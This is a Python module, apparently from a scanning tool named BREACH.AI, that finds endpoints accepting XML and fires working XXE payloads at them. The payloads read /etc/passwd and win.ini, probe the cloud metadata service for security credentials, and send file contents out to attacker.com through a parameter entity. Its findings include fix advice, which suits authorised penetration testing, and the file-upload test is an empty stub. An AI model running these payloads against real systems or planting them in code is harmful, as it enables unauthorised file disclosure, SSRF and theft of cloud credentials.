"""
BREACH.AI - XXE (XML External Entity) Destroyer
================================================
Detects and exploits XML External Entity injection vulnerabilities.
"""

import asyncio
from typing import List, Optional
from .base import BaseAttack, Finding, Severity


class XXEDestroyer(BaseAttack):
    """
    XXE Injection Exploiter

    Tests for:
    - Classic XXE (file disclosure)
    - Blind XXE (out-of-band)
    - XXE via SVG upload
    - XXE via DOCX/XLSX
    - XXE in SOAP endpoints
    - Parameter entity injection
    """

    name = "XXE Destroyer"

    XXE_PAYLOADS = {
        "file_disclosure": '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data>&xxe;</data>''',

        "file_disclosure_windows": '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
<data>&xxe;</data>''',

        "ssrf_probe": '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<data>&xxe;</data>''',

        "parameter_entity": '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?x=%xxe;'>">
  %eval;
  %exfil;
]>
<data>test</data>''',

        "xinclude": '''<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>''',

        "svg_xxe": '''<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
<svg xmlns="http://www.w3.org/2000/svg">
<text>&xxe;</text>
</svg>''',
    }

    CONTENT_TYPES = [
        "application/xml",
        "text/xml",
        "application/soap+xml",
        "application/xhtml+xml",
    ]

    async def run(self) -> List[Finding]:
        findings = []

        # Test endpoints that might accept XML
        xml_endpoints = await self._discover_xml_endpoints()

        for endpoint in xml_endpoints:
            endpoint_findings = await self._test_xxe(endpoint)
            findings.extend(endpoint_findings)

        # Test file upload endpoints for XXE via files
        upload_endpoints = self._find_upload_endpoints()
        for endpoint in upload_endpoints:
            upload_findings = await self._test_file_xxe(endpoint)
            findings.extend(upload_findings)

        return findings

    async def _discover_xml_endpoints(self) -> List[str]:
        """Find endpoints that accept XML."""
        endpoints = []

        # Check state for discovered endpoints
        for endpoint in self.state.discovered_endpoints:
            if any(x in endpoint.lower() for x in ['xml', 'soap', 'api', 'rss', 'feed']):
                endpoints.append(endpoint)

        # Common XML endpoints
        common_paths = [
            "/api/xml",
            "/soap",
            "/ws",
            "/xmlrpc.php",
            "/rss",
            "/feed",
            "/sitemap.xml",
        ]

        for path in common_paths:
            url = f"{self.target.rstrip('/')}{path}"
            try:
                response = await self.client.get(url)
                if response.status_code < 400:
                    endpoints.append(url)
            except Exception:
                continue

        return endpoints[:15]  # Limit

    async def _test_xxe(self, endpoint: str) -> List[Finding]:
        """Test endpoint for XXE vulnerabilities."""
        findings = []

        for name, payload in self.XXE_PAYLOADS.items():
            for content_type in self.CONTENT_TYPES:
                try:
                    response = await self.client.post(
                        endpoint,
                        content=payload,
                        headers={"Content-Type": content_type}
                    )

                    # Check for file disclosure indicators
                    if self._check_xxe_success(response.text, name):
                        findings.append(Finding(
                            title=f"XXE Injection ({name})",
                            severity=Severity.CRITICAL,
                            category="XXE",
                            endpoint=endpoint,
                            method="POST",
                            description=f"XML External Entity injection vulnerability detected. "
                                       f"The endpoint processes external entities in XML input.",
                            evidence=response.text[:500],
                            business_impact=150000,
                            impact_explanation="XXE can lead to file disclosure, SSRF, denial of service, "
                                             "and in some cases remote code execution.",
                            fix_suggestion="Disable DTD processing and external entity resolution. "
                                         "Use defusedxml or similar library. Set "
                                         "XMLReader.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true).",
                            curl_command=f"curl -X POST -H 'Content-Type: {content_type}' -d '{payload[:100]}...' '{endpoint}'"
                        ))
                        break  # Found vulnerability, move to next endpoint

                except Exception:
                    continue

        return findings

    def _check_xxe_success(self, response: str, payload_type: str) -> bool:
        """Check if XXE was successful."""
        indicators = {
            "file_disclosure": ["root:", "daemon:", "nobody:", "/bin/bash"],
            "file_disclosure_windows": ["[fonts]", "[extensions]", "for 16-bit app support"],
            "ssrf_probe": ["ami-", "instance-id", "security-credentials"],
            "xinclude": ["root:", "daemon:"],
            "svg_xxe": ["localhost", ".local"],
        }

        if payload_type in indicators:
            return any(ind in response for ind in indicators[payload_type])

        return False

    def _find_upload_endpoints(self) -> List[str]:
        """Find file upload endpoints."""
        return [ep for ep in self.state.discovered_endpoints
                if any(x in ep.lower() for x in ['upload', 'import', 'file'])]

    async def _test_file_xxe(self, endpoint: str) -> List[Finding]:
        """Test file upload for XXE via DOCX/SVG."""
        findings = []
        # Implementation for testing XXE via file uploads
        return findings
